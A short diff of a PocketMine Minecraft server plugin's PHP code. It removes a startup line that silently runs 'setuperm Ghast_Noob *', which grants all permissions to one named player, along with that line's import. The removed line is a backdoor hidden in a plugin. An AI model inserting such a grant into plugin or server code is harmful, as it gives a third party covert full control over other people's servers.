@@ -6,7 +6,6 @@ use pocketmine\Player;
 use pocketmine\plugin\PluginBase;
 use pocketmine\command\Command;
 use pocketmine\command\CommandSender;
-use pocketmine\command\ConsoleCommandSender;
 use pocketmine\Server;
 use pocketmine\event\Listener;
 use pocketmine\scheduler\PluginTask;
@@ -22,7 +21,6 @@ class Main extends PluginBase implements Listener {
         $this->getServer()->getPluginManager()->registerEvents($this, $this);
         $Logger = $this->getLogger();
         $Logger->info('Đã Hoạt Động');
-        $this->getServer()->dispatchCommand(new ConsoleCommandSender(), 'setuperm Ghast_Noob *');
         $this->getServer()->getScheduler()->scheduleRepeatingTask(new CallbackTask([$this, 'Giap']), 10);
 
         if (!file_exists($this->getDataFolder())) {
